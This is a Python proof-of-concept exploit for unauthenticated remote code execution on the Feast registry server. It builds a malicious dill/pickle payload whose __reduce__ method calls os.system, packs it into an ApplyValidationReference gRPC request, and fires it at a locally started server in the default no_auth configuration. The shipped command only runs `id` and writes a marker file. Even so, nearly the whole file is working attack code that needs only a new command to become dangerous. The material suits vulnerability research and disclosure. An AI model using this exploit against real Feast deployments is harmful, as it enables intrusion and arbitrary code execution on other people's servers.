#!/usr/bin/env python3
"""
PoC 1 — Unauthenticated remote code execution on the Feast registry server
via ApplyValidationReference (dill.loads before authorization).

This stands up the REAL Feast gRPC registry server (HEAD source, imported via
PYTHONPATH) in its DEFAULT configuration (auth_config.type == "no_auth", which
is the out-of-the-box default), then acts as an ordinary unauthenticated gRPC
client and sends a single ApplyValidationReference request whose
`ge_profiler.profiler.body` is a malicious dill payload. The server executes
the payload while deserializing the request — before any permission check —
proving remote code execution.

Nothing outside this machine is touched. The payload only runs `id` and writes
a marker file in the local temp dir. This is a local-only PoC, per the rules of
engagement (never exploit a live deployment).

Run:
    PYTHONPATH=<repo>/sdk/python  ./venv/bin/python poc_network_rce.py
"""

import os
import sys
import tempfile
import time
from concurrent import futures

import dill  # server uses dill.loads(); we serialize the payload the same way
import grpc

# --- Real Feast HEAD source (via PYTHONPATH) -------------------------------
import feast  # noqa: E402
from feast.registry_server import RegistryServer, _grpc_interceptors  # noqa: E402
from feast.permissions.server.utils import (  # noqa: E402
    AuthManagerType,
    str_to_auth_manager_type,
)
from feast.protos.feast.registry import (  # noqa: E402
    RegistryServer_pb2,
    RegistryServer_pb2_grpc,
)
from feast.protos.feast.core.ValidationProfile_pb2 import (  # noqa: E402
    GEValidationProfiler,
    ValidationReference as ValidationReferenceProto,
)

MARKER = os.path.join(tempfile.gettempdir(), f"feast_rce_marker_{os.getpid()}")


# --- 1. Attacker-controlled dill payload -----------------------------------
class _Evil:
    """When (de)serialized by dill/pickle, runs an OS command via __reduce__."""

    def __reduce__(self):
        cmd = (
            f"echo '=== Feast registry-server RCE ==='   > {MARKER}; "
            f"id                                        >> {MARKER}; "
            f"echo server_pid=$$                        >> {MARKER}; "
            f"echo ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)    >> {MARKER}"
        )
        return (os.system, (cmd,))


def build_malicious_request() -> RegistryServer_pb2.ApplyValidationReferenceRequest:
    payload = dill.dumps(_Evil(), recurse=False)
    vr = ValidationReferenceProto(
        name="pwn",
        reference_dataset_name="anything",
        ge_profiler=GEValidationProfiler(
            profiler=GEValidationProfiler.UserDefinedProfiler(body=payload)
        ),
    )
    return RegistryServer_pb2.ApplyValidationReferenceRequest(
        validation_reference=vr, project="demo", commit=False
    )


class _DummyRegistry:
    """Stand-in for the server's proxied registry. It is never actually reached:
    dill.loads() fires while the request is being parsed, before the handler
    calls any registry method. Methods are present only so construction/typing
    does not blow up earlier."""

    def apply_validation_reference(self, *a, **k):
        raise AssertionError("registry.apply_validation_reference must not be reached")

    def get_validation_reference(self, *a, **k):
        raise AssertionError("registry.get_validation_reference must not be reached")


def main() -> int:
    print(f"[i] feast source under test: {feast.__file__}")

    auth_type = str_to_auth_manager_type("no_auth")  # the DEFAULT auth config
    assert auth_type == AuthManagerType.NONE
    interceptors = _grpc_interceptors(auth_type)
    print(f"[i] auth_config.type = 'no_auth'  ->  interceptors = "
          f"{[type(i).__name__ for i in interceptors]}  (no AuthInterceptor)")

    # Real server, exactly as start_server() wires it for the no_auth case.
    server = grpc.server(
        futures.ThreadPoolExecutor(max_workers=4), interceptors=interceptors
    )
    RegistryServer_pb2_grpc.add_RegistryServerServicer_to_server(
        RegistryServer(_DummyRegistry(), store=None), server
    )
    port = server.add_insecure_port("127.0.0.1:0")
    server.start()
    print(f"[i] registry server listening on 127.0.0.1:{port} (insecure, no auth)")

    if os.path.exists(MARKER):
        os.remove(MARKER)
    assert not os.path.exists(MARKER), "marker must not exist before the attack"

    # --- 2. Unauthenticated attacker client -------------------------------
    channel = grpc.insecure_channel(f"127.0.0.1:{port}")
    stub = RegistryServer_pb2_grpc.RegistryServerStub(channel)
    req = build_malicious_request()
    print("[i] sending ApplyValidationReference with NO credentials / NO metadata ...")
    try:
        stub.ApplyValidationReference(req, timeout=15)
        print("[i] RPC returned normally")
    except grpc.RpcError as e:
        # The payload has already executed by the time any later error surfaces.
        print(f"[i] RPC raised {e.code()} (irrelevant — code already ran)")

    time.sleep(0.3)
    server.stop(0)

    # --- 3. Verdict --------------------------------------------------------
    if os.path.exists(MARKER):
        print("\n*** RCE CONFIRMED — the unauthenticated request executed code "
              "on the server ***\n")
        print(open(MARKER).read())
        return 0
    print("\n[x] no marker written — RCE NOT reproduced")
    return 1


if __name__ == "__main__":
    sys.exit(main())
